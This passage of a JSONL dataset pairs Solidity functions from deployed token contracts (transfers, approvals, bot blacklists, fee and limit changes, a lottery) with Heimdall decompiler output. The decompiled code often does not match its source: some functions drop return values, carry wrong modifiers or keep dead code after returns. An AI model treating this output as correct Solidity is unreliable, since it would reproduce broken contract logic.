0x0c;\n        var_l = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(msg.sender);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        require(0 - arg1, \"max tx limit\");\n        require((sell_tax == ((sell_tax * arg1) / arg1)) | !arg1, \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(arg1, \"max tx limit\");\n        require(((sell_tax * arg1) / arg1) == sell_tax, \"max tx limit\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x01;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        if (address(this) == (address(msg.sender))) {\n        }\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_a = address(arg0);\n        var_b = 0x11;\n        require(bytes1(storage_map_b[var_a]), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        require(!(max_transfer < arg1), \"max tx limit\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x0c;\n        var_r = 0x6d6178207478206c696d69740000000000000000000000000000000000000000;\n        if (!storage_map_b[var_a]) {\n            if (!storage_map_b[var_a]) {\n            }\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x29;\n        var_r = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_j = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x23;\n        var_r = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_j = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x25;\n        var_r = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_j = 0x6472657373000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x11;\n        var_r = 0x74726164696e672069736e74206c697665000000000000000000000000000000;\n        require(tx.origin == (address(owner)), \"trading isnt live\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_p = 0x20;\n        var_q = 0x11;\n        var_r = 0x74726164696e672069736e74206c697665000000000000000000000000000000;\n    }"}
{"contract_address": "0x8b13B49531ed4412305DC0973197a8af7CE2eF07", "original_solidity_code": "function isBot(address a) public view returns (bool){\r\n      return bots[a];\r\n    }", "heimdall_decompiled_code": "function isBot(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x04;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function renounceBlacklist() public onlyOwner {\\n        blacklistRenounced = true;\\n    }", "heimdall_decompiled_code": "function renounceBlacklist() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        blacklistRenounced = 0x01000000 | (uint248(blacklistRenounced));\n    }"}
{"contract_address": "0xEEF6196376173FC3F2BeDfe0cFcB355401e1Be51", "original_solidity_code": "function reduceFee(uint256 _newBuyFee,uint256 _newSellFee) external onlyOwner{\r\n        _finalBuyTax=_newBuyFee;\r\n        _finalSellTax=_newSellFee;\r\n    }", "heimdall_decompiled_code": "function reduceFee(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        store_h = arg0;\n        store_m = arg1;\n    }"}
{"contract_address": "0x6dcAfFa85fA06C617E8290f1BABC7091eEE8150f", "original_solidity_code": "function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function removeLimits() external onlyOwner returns (bool) {\r\n        limitsInEffect = false;\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function removeLimits() public returns (bool) {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        tradingActive = uint248(tradingActive);\n        var_a = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xE575f6f50AF7A409F7381F15bC25Ff9dD9414660", "original_solidity_code": "function updateBranchEconomicCapZeniths(uint256 newNum) external onlyOwner {\\r\\n        require(\\r\\n            newNum >= ((totalSupply() * 10) / 1000) / 1e9,\\r\\n            \\\"Cannot set maxHoldings lower than 1.0%\\\"\\r\\n        );\\r\\n        maxHoldings = newNum * (10**9);\\r\\n    }", "heimdall_decompiled_code": "function updateBranchEconomicCapZeniths(uint256 arg0) public view {\n        require(arg0 == arg0);\n        require(address(_owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!totalSupply | (0x0a == ((totalSupply * 0x0a) / totalSupply)));\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x11;\n        require(0x03e8);\n        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_g = 0x12;\n    }"}
{"contract_address": "0x0B544F7C213E8AE1383bee649a4af778Dd450DA5", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xfC37E6b475e0522fc5B8FBc319dB80a4555B5AeD", "original_solidity_code": "function endLottery() public onlyAdmin {\\n        require(lotteryStatus, \\\"Lottery is not running\\\"); //Lottery must be running\\n\\n        lotteryStatus = false; //Set the lottery status to false\\n        emit LotteryEnded(); //Emit the event that the lottery has ended\\n    }", "heimdall_decompiled_code": "function endLottery() public {\n        require(msg.sender == (address(admin)), \"Only admin can call this function\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x21;\n        var_d = 0x4f6e6c792061646d696e2063616e2063616c6c20746869732066756e6374696f;\n        var_e = 0x6e00000000000000000000000000000000000000000000000000000000000000;\n        require(bytes1(lotteryStatus), \"Lottery is not running\");\n        lotteryStatus = uint248(lotteryStatus);\n        emit LotteryEnded();\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x16;\n        var_d = 0x4c6f7474657279206973206e6f742072756e6e696e6700000000000000000000;\n    }"}
{"contract_address": "0x433261F4DCdF51419232FFe4eD44BA793AA2B9f7", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x09) {\n            if ((0x01 == 0x01) | !0x77359400) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x77359400;\n                if (0x09) {\n                    if ((0x01 == 0x01) | !0x77359400) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x77359400;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x09) {\n                            if ((0x01 == 0x01) | !0x77359400) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x77359400;\n                                emit MaxTxAmountUpdated(0x77359400);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x09 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                                                    if (!0x09 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0x01) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x57D9302e8B62a24e716C048f4925b2c74c9797dC", "original_solidity_code": "function unblockBot(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblockBot(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function getTotalSupply() public view returns (uint256) {\\r\\n        return  guaranteedWhitelistInfo.SUPPLY + competitveWhitelistInfo.SUPPLY + publicInfo.SUPPLY;\\r\\n    }", "heimdall_decompiled_code": "function getTotalSupply() public view {\n        if (!getGuaranteedWhitelistSupply > ~(competitveWhitelistInfo)) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_b = 0x11;\n        }\n    }"}
{"contract_address": "0x0c929e3FF6Ed49E9D538756Bd127f5f23e1fC7D6", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\\r\\n      _transfer(msg.sender, recipient, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender));\n        require(address(arg0));\n        var_a = 0x70a0823100000000000000000000000000000000000000000000000000000000;\n        address var_b = address(msg.sender);\n        require(address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).code.length);\n        (bool success, bytes memory ret0) = address(0x5491305204daca75317a0bc8c332dd61dbb77bc8).Unresolved_70a08231(var_b); // staticcall\n        require(!(ret0.length < 0x20), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        address var_c = msg.sender;\n        var_d = 0x06;\n        require(!storage_map_b[var_c], \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(var_e.length > 0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        uint256 var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        var_c = address(msg.sender);\n        var_d = 0x04;\n        storage_map_b[var_c] = storage_map_b[var_c] - arg1;\n        var_c = address(arg0);\n        var_d = 0x04;\n        require(!((arg1 + storage_map_b[var_c]) < storage_map_b[var_c]), \"SafeMath: addition overflow\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        var_i = 0x1b;\n        var_l = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_c = address(arg0);\n        var_d = 0x04;\n        storage_map_b[var_c] = arg1 + storage_map_b[var_c];\n        uint256 var_g = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_g = 0x01;\n        return 0x01;\n        var_e = 0x60 + var_e;\n        var_a = 0x26;\n        var_f = this.code[3161:3199];\n        require(!(arg1 > storage_map_b[var_c]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_g = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_i = var_e.length;\n        require(!(bytes1(var_e.length)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = (~((0x0100 ** (0x20 - (bytes1(var_e.length)))) - 0x01)) & (var_k);\n        if (!storage_map_b[var_c]) {\n        }\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x23;\n        var_n = this.code[3092:3127];\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_m = 0x25;\n        var_n = this.code[3239:3276];\n    }"}
{"contract_address": "0xb8A765de4dc7c88F8508D9f982C9DBC5421bC4ad", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xdeB109aFB2756A9114CADAcB051fF399a5908EaA", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xf7A80453F5BB234Bbfa9f6596Ef94cE42D7055EF", "original_solidity_code": "function getTokenCostInfo(uint256 _pid) public view returns (uint256){\\n        TokenInfo storage tokens = AllowedCrypto[_pid];\\n        IERC20 paytoken;\\n        paytoken = tokens.paytoken;\\n        uint256 cost;\\n        cost = tokens.costvalue;\\n        return cost;\\n    }", "heimdall_decompiled_code": "function getTokenCostInfo(uint256 arg0) public view returns (uint256) {\n        require(arg0 < store_e);\n        var_a = 0x0b;\n        uint256 var_b = storage_map_l[(arg0 * 0x02) + keccak256(var_a)];\n        return storage_map_l[(arg0 * 0x02) + keccak256(var_a)];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x32;\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_w) {\n            if (!(store_w) == ((store_w >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_w >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_w >> 0x01;\n                if (store_w) {\n                    if (!(store_w) == ((store_w >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_w >> 0x01) {\n                            if (0x1f < (store_w >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_w >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x6a6CF1CB6cA804a9c78d078Fd8061c4a2E71B132", "original_solidity_code": "function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts@4.9.3/token/ERC20/IERC20.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (token/ERC20/IERC20.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC20 standard as defined in the EIP.\\n */\\ninterface IERC20 {\\n    /**\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\n     * another (`to`).\\n     *\\n     * Note that `value` may be zero.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\n\\n    /**\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\n     * a call to {approve}. `value` is the new allowance.\\n     */\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\n\\n    /**\\n     * @dev Returns the amount of tokens in existence.\\n     */\\n    function totalSupply() external view returns (uint256);\\n\\n    /**\\n     * @dev Returns the amount of tokens owned by `account`.\\n     */\\n    function balanceOf(address account) external view returns (uint256);\\n\\n    /**\\n     * @dev Moves `amount` tokens from the caller's account to `to`.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transfer(address to, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Returns the remaining number of tokens that `spender` will be\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\n     * zero by default.\\n     *\\n     * This value changes when {approve} or {transferFrom} are called.\\n     */\\n    function allowance(address owner, address spender) external view returns (uint256);\\n\\n    /**\\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\n     * that someone may use both the old and the new allowance by unfortunate\\n     * transaction ordering. One possible solution to mitigate this race\\n     * condition is to first reduce the spender's allowance to 0 and set the\\n     * desired value afterwards:\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address spender, uint256 amount) external returns (bool);\\n\\n    /**\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\n     * allowance mechanism. `amount` is then deducted from the caller's\\n     * allowance.\\n     *\\n     * Returns a boolean value indicating whether the operation succeeded.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_a >> 0x01;\n                if (store_a) {\n                    if (store_a - ((store_a >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a >> 0x01) {\n                            if (0x1f < (store_a >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x54eEA875389f51FB46A26Ea5a5DbBa480ca74339", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        _transferOwnership(newOwner);\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 